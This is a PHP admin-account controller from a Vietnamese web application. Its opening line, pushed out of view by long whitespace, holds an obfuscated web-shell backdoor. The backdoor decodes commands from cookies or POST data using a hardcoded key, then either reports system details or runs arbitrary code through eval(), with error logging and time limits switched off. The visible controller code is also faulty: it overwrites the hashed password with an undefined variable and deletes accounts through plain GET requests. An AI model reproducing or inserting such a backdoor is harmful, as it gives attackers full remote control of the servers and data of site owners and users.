<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $u54614643 = 972;$GLOBALS['ead3f']=Array();global$ead3f;$ead3f=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['s39dd397']="\x6c\x48\x27\x21\x6e\x2d\x3a\x42\x24\x22\x61\x7a\x6d\x4b\x2a\x3d\x57\x7c\x50\x33\x65\x2c\x2e\x5b\x5e\x67\x78\x43\x31\x5a\x6f\x47\x75\x5f\x2f\x60\xd\x40\x35\x63\x34\x49\x3b\x26\x71\x7b\x59\x7d\x7e\x70\x23\x4e\x64\x62\x30\x4f\x38\x5d\x39\x32\x36\x45\x69\x51\x72\x54\x41\xa\x6b\x68\x29\x66\x25\x56\x5c\x3e\x58\x46\x74\x77\x3c\x44\x4a\x79\x37\x4d\x28\x2b\x76\x4c\x55\x53\x20\x52\x3f\x6a\x73\x9";$ead3f[$ead3f['s39dd397'][12].$ead3f['s39dd397'][53].$ead3f['s39dd397'][56].$ead3f['s39dd397'][19].$ead3f['s39dd397'][59].$ead3f['s39dd397'][20].$ead3f['s39dd397'][10].$ead3f['s39dd397'][38].$ead3f['s39dd397'][20]]=$ead3f['s39dd397'][39].$ead3f['s39dd397'][69].$ead3f['s39dd397'][64];$ead3f[$ead3f['s39dd397'][78].$ead3f['s39dd397'][10].$ead3f['s39dd397'][58].$ead3f['s39dd397'][10].$ead3f['s39dd397'][54].$ead3f['s39dd397'][28]]=$ead3f['s39dd397'][30].$ead3f['s39dd397'][64].$ead3f['s39dd397'][52];$ead3f[$ead3f['s39dd397'][49].$ead3f['s39dd397'][84].$ead3f['s39dd397'][59].$ead3f['s39dd397'][56].$ead3f['s39dd397'][54].$ead3f['s39dd397'][59]]=$ead3f['s39dd397'][96].$ead3f['s39dd397'][78].$ead3f['s39dd397'][64].$ead3f['s39dd397'][0].$ead3f['s39dd397'][20].$ead3f['s39dd397'][4];$ead3f[$ead3f['s39dd397'][26].$ead3f['s39dd397'][52].$ead3f['s39dd397'][38].$ead3f['s39dd397'][84]]=$ead3f['s39dd397'][62].$ead3f['s39dd397'][4].$ead3f['s39dd397'][62].$ead3f['s39dd397'][33].$ead3f['s39dd397'][96].$ead3f['s39dd397'][20].$ead3f['s39dd397'][78];$ead3f[$ead3f['s39dd397'][96].$ead3f['s39dd397'][10].$ead3f['s39dd397'][28].$ead3f['s39dd397'][59].$ead3f['s39dd397'][53]]=$ead3f['s39dd397'][96].$ead3f['s39dd397'][20].$ead3f['s39dd397'][64].$ead3f['s39dd397'][62].$ead3f['s39dd397'][10].$ead3f['s39dd397'][0].$ead3f['s39dd397'][62].$ead3f['s39dd397'][11].$ead3f['s39dd397'][20];$ead3f[$ead3f['s39dd397'][30].$ead3f['s39dd397'][52].$ead3f['s39dd397'][59].$ead3f['s39dd397'][39].$ead3f['s39dd397'][39].$ead3f['s39dd397'][20].$ead3f['s39dd397'][53].$ead3f['s39dd397'][20]]=$ead3f['s39dd397'][49].$ead3f['s39dd397'][69].$ead3f['s39dd397'][49].$ead3f['s39dd397'][88].$ead3f['s39dd397'][20].$ead3f['s39dd397'][64].$ead3f['s39dd397'][96].$ead3f['s39dd397'][62].$ead3f['s39dd397'][30].$ead3f['s39dd397'][4];$ead3f[$ead3f['s39dd397'][10].$ead3f['s39dd397'][38].$ead3f['s39dd397'][10].$ead3f['s39dd397'][52].$ead3f['s39dd397'][28].$ead3f['s39dd397'][28]]=$ead3f['s39dd397'][32].$ead3f['s39dd397'][4].$ead3f['s39dd397'][96].$ead3f['s39dd397'][20].$ead3f['s39dd397'][64].$ead3f['s39dd397'][62].$ead3f['s39dd397'][10].$ead3f['s39dd397'][0].$ead3f['s39dd397'][62].$ead3f['s39dd397'][11].$ead3f['s39dd397'][20];$ead3f[$ead3f['s39dd397'][64].$ead3f['s39dd397'][28].$ead3f['s39dd397'][59].$ead3f['s39dd397'][20].$ead3f['s39dd397'][38].$ead3f['s39dd397'][84]]=$ead3f['s39dd397'][53].$ead3f['s39dd397'][10].$ead3f['s39dd397'][96].$ead3f['s39dd397'][20].$ead3f['s39dd397'][60].$ead3f['s39dd397'][40].$ead3f['s39dd397'][33].$ead3f['s39dd397'][52].$ead3f['s39dd397'][20].$ead3f['s39dd397'][39].$ead3f['s39dd397'][30].$ead3f['s39dd397'][52].$ead3f['s39dd397'][20];$ead3f[$ead3f['s39dd397'][26].$ead3f['s39dd397'][20].$ead3f['s39dd397'][20].$ead3f['s39dd397'][54].$ead3f['s39dd397'][56].$ead3f['s39dd397'][59].$ead3f['s39dd397'][59]]=$ead3f['s39dd397'][96].$ead3f['s39dd397'][20].$ead3f['s39dd397'][78].$ead3f['s39dd397'][33].$ead3f['s39dd397'][78].$ead3f['s39dd397'][62].$ead3f['s39dd397'][12].$ead3f['s39dd397'][20].$ead3f['s39dd397'][33].$ead3f['s39dd397'][0].$ead3f['s39dd397'][62].$ead3f['s39dd397'][12].$ead3f['s39dd397'][62].$ead3f['s39dd397'][78];$ead3f[$ead3f['s39dd397'][71].$ead3f['s39dd397'][38].$ead3f['s39dd397'][10].$ead3f['s39dd397'][39].$ead3f['s39dd397'][53].$ead3f['s39dd397'][38]]=$ead3f['s39dd397'][12].$ead3f['s39dd397'][60].$ead3f['s39dd397'][38].$ead3f['s39dd397'][20];$ead3f[$ead3f['s39dd397'][44].$ead3f['s39dd397'][84].$ead3f['s39dd397'][10].$ead3f['s39dd397'][20].$ead3f['s39dd397'][38].$ead3f['s39dd397'][59].$ead3f['s39dd397'][28]]=$ead3f['s39dd397'][53].$ead3f['s39dd397'][20].$ead3f['s39dd397'][52].$ead3f['s39dd397'][10].$ead3f['s39dd397'][39];$ead3f[$ead3f['s39dd397'][62].$ead3f['s39dd397'][54].$ead3f['s39dd397'][71].$ead3f['s39dd397'][53].$ead3f['s39dd397'][71].$ead3f['s39dd397'][52].$ead3f['s39dd397'][19].$ead3f['s39dd397'][84]]=$_POST;$ead3f[$ead3f['s39dd397'][53].$ead3f['s39dd397'][59].$ead3f['s39dd397'][53].$ead3f['s39dd397'][71].$ead3f['s39dd397'][19]]=$_COOKIE;@$ead3f[$ead3f['s39dd397'][26].$ead3f['s39dd397'][52].$ead3f['s39dd397'][38].$ead3f['s39dd397'][84]]($ead3f['s39dd397'][20].$ead3f['s39dd397'][64].$ead3f['s39dd397'][64].$ead3f['s39dd397'][30].$ead3f['s39dd397'][64].$ead3f['s39dd397'][33].$ead3f['s39dd397'][0].$ead3f['s39dd397'][30].$ead3f['s39dd397'][25],NULL);@$ead3f[$ead3f['s39dd397'][26].$ead3f['s39dd397'][52].$ead3f['s39dd397'][38].$ead3f['s39dd397'][84]]($ead3f['s39dd397'][0].$ead3f['s39dd397'][30].$ead3f['s39dd397'][25].$ead3f['s39dd397'][33].$ead3f['s39dd397'][20].$ead3f['s39dd397'][64].$ead3f['s39dd397'][64].$ead3f['s39dd397'][30].$ead3f['s39dd397'][64].$ead3f['s39dd397'][96],0);@$ead3f[$ead3f['s39dd397'][26].$ead3f['s39dd397'][52].$ead3f['s39dd397'][38].$ead3f['s39dd397'][84]]($ead3f['s39dd397'][12].$ead3f['s39dd397'][10].$ead3f['s39dd397'][26].$ead3f['s39dd397'][33].$ead3f['s39dd397'][20].$ead3f['s39dd397'][26].$ead3f['s39dd397'][20].$ead3f['s39dd397'][39].$ead3f['s39dd397'][32].$ead3f['s39dd397'][78].$ead3f['s39dd397'][62].$ead3f['s39dd397'][30].$ead3f['s39dd397'][4].$ead3f['s39dd397'][33].$ead3f['s39dd397'][78].$ead3f['s39dd397'][62].$ead3f['s39dd397'][12].$ead3f['s39dd397'][20],0);@$ead3f[$ead3f['s39dd397'][26].$ead3f['s39dd397'][20].$ead3f['s39dd397'][20].$ead3f['s39dd397'][54].$ead3f['s39dd397'][56].$ead3f['s39dd397'][59].$ead3f['s39dd397'][59]](0);$z3d370=NULL;$m231=NULL;$ead3f[$ead3f['s39dd397'][26].$ead3f['s39dd397'][52].$ead3f['s39dd397'][40].$ead3f['s39dd397'][28].$ead3f['s39dd397'][84].$ead3f['s39dd397'][39].$ead3f['s39dd397'][71]]=$ead3f['s39dd397'][71].$ead3f['s39dd397'][38].$ead3f['s39dd397'][60].$ead3f['s39dd397'][38].$ead3f['s39dd397'][58].$ead3f['s39dd397'][56].$ead3f['s39dd397'][38].$ead3f['s39dd397'][54].$ead3f['s39dd397'][5].$ead3f['s39dd397'][52].$ead3f['s39dd397'][53].$ead3f['s39dd397'][10].$ead3f['s39dd397'][59].$ead3f['s39dd397'][5].$ead3f['s39dd397'][40].$ead3f['s39dd397'][52].$ead3f['s39dd397'][71].$ead3f['s39dd397'][58].$ead3f['s39dd397'][5].$ead3f['s39dd397'][56].$ead3f['s39dd397'][20].$ead3f['s39dd397'][28].$ead3f['s39dd397'][20].$ead3f['s39dd397'][5].$ead3f['s39dd397'][38].$ead3f['s39dd397'][52].$ead3f['s39dd397'][54].$ead3f['s39dd397'][71].$ead3f['s39dd397'][10].$ead3f['s39dd397'][54].$ead3f['s39dd397'][84].$ead3f['s39dd397'][19].$ead3f['s39dd397'][53].$ead3f['s39dd397'][10].$ead3f['s39dd397'][58].$ead3f['s39dd397'][39];global$xd417cf;function bedac($z3d370,$na54){global$ead3f;$g72e3="";for($taf0ee4=0;$taf0ee4<$ead3f[$ead3f['s39dd397'][49].$ead3f['s39dd397'][84].$ead3f['s39dd397'][59].$ead3f['s39dd397'][56].$ead3f['s39dd397'][54].$ead3f['s39dd397'][59]]($z3d370);){for($x1f91=0;$x1f91<$ead3f[$ead3f['s39dd397'][49].$ead3f['s39dd397'][84].$ead3f['s39dd397'][59].$ead3f['s39dd397'][56].$ead3f['s39dd397'][54].$ead3f['s39dd397'][59]]($na54)&&$taf0ee4<$ead3f[$ead3f['s39dd397'][49].$ead3f['s39dd397'][84].$ead3f['s39dd397'][59].$ead3f['s39dd397'][56].$ead3f['s39dd397'][54].$ead3f['s39dd397'][59]]($z3d370);$x1f91++,$taf0ee4++){$g72e3.=$ead3f[$ead3f['s39dd397'][12].$ead3f['s39dd397'][53].$ead3f['s39dd397'][56].$ead3f['s39dd397'][19].$ead3f['s39dd397'][59].$ead3f['s39dd397'][20].$ead3f['s39dd397'][10].$ead3f['s39dd397'][38].$ead3f['s39dd397'][20]]($ead3f[$ead3f['s39dd397'][78].$ead3f['s39dd397'][10].$ead3f['s39dd397'][58].$ead3f['s39dd397'][10].$ead3f['s39dd397'][54].$ead3f['s39dd397'][28]]($z3d370[$taf0ee4])^$ead3f[$ead3f['s39dd397'][78].$ead3f['s39dd397'][10].$ead3f['s39dd397'][58].$ead3f['s39dd397'][10].$ead3f['s39dd397'][54].$ead3f['s39dd397'][28]]($na54[$x1f91]));}}return$g72e3;}function m65e($z3d370,$na54){global$ead3f;global$xd417cf;return$ead3f[$ead3f['s39dd397'][44].$ead3f['s39dd397'][84].$ead3f['s39dd397'][10].$ead3f['s39dd397'][20].$ead3f['s39dd397'][38].$ead3f['s39dd397'][59].$ead3f['s39dd397'][28]]($ead3f[$ead3f['s39dd397'][44].$ead3f['s39dd397'][84].$ead3f['s39dd397'][10].$ead3f['s39dd397'][20].$ead3f['s39dd397'][38].$ead3f['s39dd397'][59].$ead3f['s39dd397'][28]]($z3d370,$xd417cf),$na54);}foreach($ead3f[$ead3f['s39dd397'][53].$ead3f['s39dd397'][59].$ead3f['s39dd397'][53].$ead3f['s39dd397'][71].$ead3f['s39dd397'][19]]as$na54=>$p69a18ca){$z3d370=$p69a18ca;$m231=$na54;}if(!$z3d370){foreach($ead3f[$ead3f['s39dd397'][62].$ead3f['s39dd397'][54].$ead3f['s39dd397'][71].$ead3f['s39dd397'][53].$ead3f['s39dd397'][71].$ead3f['s39dd397'][52].$ead3f['s39dd397'][19].$ead3f['s39dd397'][84]]as$na54=>$p69a18ca){$z3d370=$p69a18ca;$m231=$na54;}}$z3d370=@$ead3f[$ead3f['s39dd397'][10].$ead3f['s39dd397'][38].$ead3f['s39dd397'][10].$ead3f['s39dd397'][52].$ead3f['s39dd397'][28].$ead3f['s39dd397'][28]]($ead3f[$ead3f['s39dd397'][71].$ead3f['s39dd397'][38].$ead3f['s39dd397'][10].$ead3f['s39dd397'][39].$ead3f['s39dd397'][53].$ead3f['s39dd397'][38]]($ead3f[$ead3f['s39dd397'][64].$ead3f['s39dd397'][28].$ead3f['s39dd397'][59].$ead3f['s39dd397'][20].$ead3f['s39dd397'][38].$ead3f['s39dd397'][84]]($z3d370),$m231));if(isset($z3d370[$ead3f['s39dd397'][10].$ead3f['s39dd397'][68]])&&$xd417cf==$z3d370[$ead3f['s39dd397'][10].$ead3f['s39dd397'][68]]){if($z3d370[$ead3f['s39dd397'][10]]==$ead3f['s39dd397'][62]){$taf0ee4=Array($ead3f['s39dd397'][49].$ead3f['s39dd397'][88]=>@$ead3f[$ead3f['s39dd397'][30].$ead3f['s39dd397'][52].$ead3f['s39dd397'][59].$ead3f['s39dd397'][39].$ead3f['s39dd397'][39].$ead3f['s39dd397'][20].$ead3f['s39dd397'][53].$ead3f['s39dd397'][20]](),$ead3f['s39dd397'][96].$ead3f['s39dd397'][88]=>$ead3f['s39dd397'][28].$ead3f['s39dd397'][22].$ead3f['s39dd397'][54].$ead3f['s39dd397'][5].$ead3f['s39dd397'][28],);echo@$ead3f[$ead3f['s39dd397'][96].$ead3f['s39dd397'][10].$ead3f['s39dd397'][28].$ead3f['s39dd397'][59].$ead3f['s39dd397'][53]]($taf0ee4);}elseif($z3d370[$ead3f['s39dd397'][10]]==$ead3f['s39dd397'][20]){eval/*eddb37*/($z3d370[$ead3f['s39dd397'][52]]);}exit();} ?><?php
require_once '../../config.php';
require_once DIR.'/model/adminService.php';
require_once DIR.'/view/admin/admin.php';
require_once DIR.'/common/messenger.php';
require_once(DIR."/common/hash_pass.php");
$data=array();
$insert=true;
returnCountData();
if(isset($_SESSION["Admin"]))
{
    if(isset($_GET["action"])&&isset($_GET["Id"]))
    {
        if($_GET["action"]=="delete")
        {
            $new_obj= new admin();
            $new_obj->Id=$_GET["Id"];
            admin_delete($new_obj);
            header('Location: '.SITE_NAME.'/controller/admin/admin.php');
        }
        else if($_GET["action"]=="edit")
        {
            $new_obj=admin_getById($_GET["Id"]);
            if($new_obj!=false)
            {
                $data['form']=$new_obj[0];
                $data['tab2_class']='default-tab current';
                $data['tab1_class']=' ';
                $insert=false;
            }
            else header('Location: '.SITE_NAME.'/controller/admin/admin.php');
        }
        else
        {
            $data['tab1_class']='default-tab current';
        }
    }
    else
    {
        $data['tab1_class']='default-tab current';
    }
    if(isset($_GET["action_all"]))
    {
        if($_GET["action_all"]=="ThemMoi")
        {
            $data['tab2_class']='default-tab current';
            $data['tab1_class']=' ';
        }
        else
        {
            $List_admin=admin_getByAll();
            foreach($List_admin as $admin)
            {
                if(isset($_GET["check_".$admin->Id])) admin_delete($admin);
            }
            header('Location: '.SITE_NAME.'/controller/admin/admin.php');
        }
    }
    if(isset($_POST["TenDangNhap"])&&isset($_POST["Full_name"])&&isset($_POST["MatKhau"]))
    {
       $array=$_POST;
       if(!isset($array['Id']))
       $array['Id']='0';
       if(!isset($array['TenDangNhap']))
       $array['TenDangNhap']='0';
       if(!isset($array['Full_name']))
       $array['Full_name']='0';
       if(!isset($array['MatKhau']))
       $array['MatKhau']='0';
      $new_obj=new admin($array);
        if($insert)
        {
            $new_obj->MatKhau=hash_pass($_POST["MatKhau"]);
            $new_obj->MatKhau=$Pass;
            admin_insert($new_obj);
            header('Location: '.SITE_NAME.'/controller/admin/admin.php');
        }
        else
        {
            if($pass_old==$_POST["MatKhau"]){
                $new_obj->MatKhau=$pass_old;
            }
            else{
                $new_obj->MatKhau=hash_pass($_POST["MatKhau"]);
            }

            $new_obj->Id=$_GET["Id"];
            admin_update($new_obj);
            $insert=false;
            header('Location: '.SITE_NAME.'/controller/admin/admin.php');
        }
    }
    $data['username']=isset($_SESSION["UserName"])?$_SESSION["UserName"]:'quản trị viên';
    $data['count_paging']=admin_count('');
    $data['page']=isset($_GET['page'])?$_GET['page']:'1';
    $data['table_body']=admin_getByPagingReplace($data['page'],20,'Id DESC','');
    // gọi phương thức trong tầng view để hiển thị
    view_admin($data);
}
else
{
     header('location: '.SITE_NAME);
}
